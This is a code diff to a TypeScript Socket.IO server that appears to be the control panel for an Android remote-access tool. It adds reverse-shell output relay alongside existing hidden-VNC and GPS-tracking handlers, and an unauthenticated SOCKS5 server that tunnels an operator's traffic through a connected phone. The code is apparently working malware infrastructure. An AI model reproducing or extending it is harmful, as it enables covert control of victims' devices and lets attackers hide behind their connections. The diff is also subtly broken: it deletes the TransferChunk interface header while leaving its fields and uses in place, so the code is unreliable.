@@ -2,6 +2,8 @@ import type { Server as HttpServer } from 'http';
 import type { Socket } from 'socket.io';
 import { Server as SocketIOServer } from 'socket.io';
 import type { FastifyInstance } from 'fastify';
+import * as net from 'net';
+import crypto from 'crypto';
 import geoip from 'geoip-lite';
 import { getDb, dbHelpers } from '../db/index.js';
 import { clients } from '../db/schema.js';
@@ -13,7 +15,16 @@ import { log } from '../utils/logger.js';
 import { verifyJwtToken } from '../middleware/auth.js';
 import { acknowledgeCredentialRotation, authenticateDevice } from './deviceAuth.js';
 
-interface TransferChunk {
+interface ProxyTunnel {
+  connId: string;
+  clientId: string;
+  clientSocket: net.Socket;
+  targetHost: string;
+  targetPort: number;
+  bytesToTarget: number;
+  bytesFromTarget: number;
+  createdAt: number;
+}
   transferId: string;
   name: string;
   path?: string;
@@ -55,6 +66,9 @@ class SocketService {
   private sockets: Map<string, Socket> = new Map();
   private gpsTimers: Map<string, NodeJS.Timeout> = new Map();
   private transfers: Map<string, TransferChunk> = new Map();
+  private proxyServer: net.Server | null = null;
+  private proxyConnections: Map<string, ProxyTunnel> = new Map();
+  private proxyClientMap: Map<string, string> = new Map(); // clientId → admin requesting proxy
 
   initialize(httpServer: HttpServer, fastifyApp: FastifyInstance): void {
     const config = getConfig();
@@ -145,6 +159,21 @@ class SocketService {
     socket.on('hvnc:unsubscribe', (payload: { id?: string }) => {
       if (typeof payload?.id === 'string' && payload.id.length > 0) {
         socket.leave(`hvnc:${payload.id}`);
+      }
+    });
+    socket.on('shell:subscribe', (payload: { id?: string }) => {
+      const user = (socket as any).user;
+      if (!user?.permissions?.includes('device:shell')) {
+        socket.emit('shell:error', { id: payload?.id || '', error: 'Insufficient shell permission' });
+        return;
+      }
+      if (typeof payload?.id === 'string' && payload.id.length > 0 && payload.id.length <= 256) {
+        socket.join(`shell:${payload.id}`);
+      }
+    });
+    socket.on('shell:unsubscribe', (payload: { id?: string }) => {
+      if (typeof payload?.id === 'string' && payload.id.length > 0) {
+        socket.leave(`shell:${payload.id}`);
       }
     });
     log.info('Admin frontend connected to Socket.IO');
@@ -954,6 +983,65 @@ class SocketService {
         }
       } catch (err: unknown) { log.error(`HVNC control handler error: ${err instanceof Error ? err.message : String(err)}`); }
     });
+
+    // ── Shell: Reverse shell output from device → admin ──
+    socket.on(CMD.SHELL, (data: any) => {
+      try {
+        const sessionId = typeof data?.sessionId === 'string' ? data.sessionId : 'default';
+        if (data?.event === 'output') {
+          this.io.to(`shell:${id}`).emit('shell:output', {
+            id,
+            sessionId,
+            output: typeof data.output === 'string' ? data.output : '',
+            exitCode: data.exitCode ?? null,
+          });
+        } else {
+          // Status/action responses
+          this.io.to(`shell:${id}`).emit('shell:status', {
+            id,
+            sessionId,
+            action: data.action,
+            success: data.success,
+            enabled: data.enabled,
+          });
+        }
+      } catch (err: unknown) {
+        log.error(`Shell handler error: ${err instanceof Error ? err.message : String(err)}`);
+      }
+    });
+
+    // ── Proxy: Data from device (target responses) → SOCKS5 client ──
+    socket.on(CMD.PROXY, (data: any) => {
+      try {
+        const connId = data?.connId;
+        if (!connId) return;
+
+        const tunnel = this.proxyConnections.get(connId);
+        if (!tunnel || tunnel.clientId !== id) return;
+
+        switch (data.event) {
+          case 'connected':
+            // Proxy tunnel established — client socket already connected
+            break;
+          case 'data':
+            if (data.data && tunnel.clientSocket && !tunnel.clientSocket.destroyed) {
+              const buf = Buffer.from(data.data, 'base64');
+              tunnel.bytesFromTarget += buf.length;
+              tunnel.clientSocket.write(buf);
+            }
+            break;
+          case 'close':
+          case 'error':
+            if (tunnel.clientSocket && !tunnel.clientSocket.destroyed) {
+              tunnel.clientSocket.end();
+            }
+            this.proxyConnections.delete(connId);
+            break;
+        }
+      } catch (err: unknown) {
+        log.error(`Proxy handler error: ${err instanceof Error ? err.message : String(err)}`);
+      }
+    });
   }
 
   send(clientId: string, cmd: CmdType, params: Record<string, unknown> = {}): boolean {
@@ -1044,10 +1132,242 @@ class SocketService {
     }
   }
 
+  // ── SOCKS5 Proxy TCP Server ──────────────────────────────────────
+
+  /**
+   * Start a local SOCKS5 TCP server that tunnels traffic through
+   * the specified Android device.
+   */
+  startProxyServer(clientId: string, port: number = 1080): boolean {
+    if (this.proxyServer) {
+      log.warn(`Proxy server already running`);
+      return false;
+    }
+    if (!this.sockets.has(clientId)) {
+      log.warn(`Client ${clientId} is not connected`);
+      return false;
+    }
+
+    this.proxyClientMap.set(clientId, clientId);
+
+    this.proxyServer = net.createServer((clientSocket: net.Socket) => {
+      this.handleProxyConnection(clientId, clientSocket);
+    });
+
+    this.proxyServer.on('error', (err: Error) => {
+      log.error(`Proxy server error: ${err.message}`);
+      this.stopProxyServer();
+    });
+
+    this.proxyServer.listen(port, '0.0.0.0', () => {
+      log.info(`SOCKS5 proxy server started on port ${port} for client ${clientId}`);
+      this.io.to('admin').emit('proxy:status', { clientId, running: true, port });
+    });
+
+    return true;
+  }
+
+  stopProxyServer(): void {
+    if (this.proxyServer) {
+      this.proxyServer.close();
+      this.proxyServer = null;
+      this.proxyClientMap.clear();
+      // Close all proxy tunnels
+      for (const [connId, tunnel] of this.proxyConnections) {
+        try { tunnel.clientSocket.end(); } catch (e) { /* ignore */ }
+      }
+      this.proxyConnections.clear();
+      this.io.to('admin').emit('proxy:status', { running: false });
+      log.info('SOCKS5 proxy server stopped');
+    }
+  }
+
+  isProxyRunning(): boolean {
+    return this.proxyServer !== null && this.proxyServer.listening;
+  }
+
+  getProxyConnections(): { connId: string; target: string; bytesToTarget: number; bytesFromTarget: number; duration: number }[] {
+    const now = Date.now();
+    return Array.from(this.proxyConnections.values()).map(t => ({
+      connId: t.connId,
+      target: `${t.targetHost}:${t.targetPort}`,
+      bytesToTarget: t.bytesToTarget,
+      bytesFromTarget: t.bytesFromTarget,
+      duration: Math.floor((now - t.createdAt) / 1000),
+    }));
+  }
+
+  private handleProxyConnection(clientId: string, clientSocket: net.Socket): void {
+    let handshakeDone = false;
+    let targetHost = '';
+    let targetPort = 0;
+    const connId = crypto.randomUUID();
+
+    // Buffer for SOCKS5 handshake
+    let handshakeBuf = Buffer.alloc(0);
+    const MAX_HANDSHAKE = 1024; // safety limit
+
+    clientSocket.on('data', (chunk: Buffer) => {
+      try {
+        if (!handshakeDone) {
+          handshakeBuf = Buffer.concat([handshakeBuf, chunk]);
+          if (handshakeBuf.length > MAX_HANDSHAKE) {
+            clientSocket.end();
+            return;
+          }
+
+          // SOCKS5 greeting: VER (1), NMETHODS (1), METHODS (NMETHODS)
+          if (handshakeBuf.length >= 2 && !(handshakeBuf as any)._greeted) {
+            const ver = handshakeBuf[0];
+            const nmethods = handshakeBuf[1];
+            if (ver !== 0x05 || handshakeBuf.length < 2 + nmethods) return; // need more data
+            // Reply: no auth required (0x00)
+            clientSocket.write(Buffer.from([0x05, 0x00]));
+            (handshakeBuf as any)._greeted = true;
+            handshakeBuf = handshakeBuf.slice(2 + nmethods);
+          }
+
+          // SOCKS5 request: VER (1), CMD (1), RSV (1), ATYP (1), DST.ADDR (var), DST.PORT (2)
+          if ((handshakeBuf as any)._greeted && handshakeBuf.length >= 4) {
+            const cmd = handshakeBuf[1]; // 0x01 = CONNECT
+            const atyp = handshakeBuf[3];
+
+            let addrLen = 0;
+            if (atyp === 0x01) addrLen = 4;      // IPv4
+            else if (atyp === 0x03) addrLen = 1;  // domain name (length prefix)
+            else if (atyp === 0x04) addrLen = 16; // IPv6
+            else {
+              // Unsupported address type
+              clientSocket.write(Buffer.from([0x05, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]));
+              clientSocket.end();
+              return;
+            }
+
+            let minLen = 4 + addrLen + 2; // header + addr + port
+            if (atyp === 0x03) {
+              if (handshakeBuf.length < 5) return; // need domain length byte
+              minLen = 4 + 1 + handshakeBuf[4] + 2;
+            }
+
+            if (handshakeBuf.length < minLen) return; // need more data
+
+            if (cmd !== 0x01) {
+              // Only CONNECT supported
+              clientSocket.write(Buffer.from([0x05, 0x07, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]));
+              clientSocket.end();
+              return;
+            }
+
+            // Parse target address
+            if (atyp === 0x01) {
+              targetHost = `${handshakeBuf[4]}.${handshakeBuf[5]}.${handshakeBuf[6]}.${handshakeBuf[7]}`;
+              targetPort = handshakeBuf.readUInt16BE(8);
+            } else if (atyp === 0x03) {
+              const domainLen = handshakeBuf[4];
+              targetHost = handshakeBuf.slice(5, 5 + domainLen).toString('utf8');
+              targetPort = handshakeBuf.readUInt16BE(5 + domainLen);
+            } else if (atyp === 0x04) {
+              const ip = [];
+              for (let i = 0; i < 16; i += 2) {
+                ip.push(handshakeBuf.readUInt16BE(4 + i).toString(16));
+              }
+              targetHost = ip.join(':');
+              targetPort = handshakeBuf.readUInt16BE(20);
+            }
+
+            // Send connect command to Android
+            const sent = this.send(clientId, CMD.PROXY as any, {
+              action: 'connect',
+              connId,
+              host: targetHost,
+              port: targetPort,
+            });
+
+            if (!sent) {
+              // Device offline
+              clientSocket.write(Buffer.from([0x05, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]));
+              clientSocket.end();
+              return;
+            }
+
+            // Store tunnel
+            const tunnel: ProxyTunnel = {
+              connId,
+              clientId,
+              clientSocket,
+              targetHost,
+              targetPort,
+              bytesToTarget: 0,
+              bytesFromTarget: 0,
+              createdAt: Date.now(),
+            };
+            this.proxyConnections.set(connId, tunnel);
+
+            handshakeDone = true;
+            handshakeBuf = Buffer.alloc(0);
+
+            // Send SOCKS5 success reply
+            // We use 0.0.0.0:0 as BND.ADDR since the connection is remote
+            const reply = Buffer.from([0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
+            clientSocket.write(reply);
+
+            dbHelpers.addLog('INFO', 'PROXY', `SOCKS5 connect: ${targetHost}:${targetPort} via ${clientId}`);
+          }
+        } else {
+          // Post-handshake: forward data from SOCKS5 client to Android
+          const tunnel = this.proxyConnections.get(connId);
+          if (tunnel) {
+            tunnel.bytesToTarget += chunk.length;
+            this.send(clientId, CMD.PROXY as any, {
+              action: 'data',
+              connId,
+              data: chunk.toString('base64'),
+            });
+          }
+        }
+      } catch (err: unknown) {
+        log.error(`Proxy handshake error: ${err instanceof Error ? err.message : String(err)}`);
+        try { clientSocket.end(); } catch (e) { /* ignore */ }
+      }
+    });
+
+    clientSocket.on('close', () => {
+      const tunnel = this.proxyConnections.get(connId);
+      if (tunnel) {
+        this.proxyConnections.delete(connId);
+        // Tell Android to close the connection
+        this.send(clientId, CMD.PROXY as any, {
+          action: 'close',
+          connId,
+        });
+        dbHelpers.addLog('INFO', 'PROXY', `SOCKS5 close: ${targetHost}:${targetPort} via ${clientId} (to: ${tunnel.bytesToTarget}B, from: ${tunnel.bytesFromTarget}B)`);
+      }
+    });
+
+    clientSocket.on('error', (err: Error) => {
+      const tunnel = this.proxyConnections.get(connId);
+      if (tunnel) {
+        this.proxyConnections.delete(connId);
+        this.send(clientId, CMD.PROXY as any, {
+          action: 'close',
+          connId,
+        });
+      }
+    });
+
+    // 30-second handshake timeout
+    setTimeout(() => {
+      if (!handshakeDone) {
+        try { clientSocket.end(); } catch (e) { /* ignore */ }
+      }
+    }, 30000);
+  }
+
   shutdown(): void {
     for (const [, timer] of this.gpsTimers) clearInterval(timer);
     this.gpsTimers.clear();
     this.transfers.clear();
+    this.stopProxyServer();
     this.io.close();
   }
 }
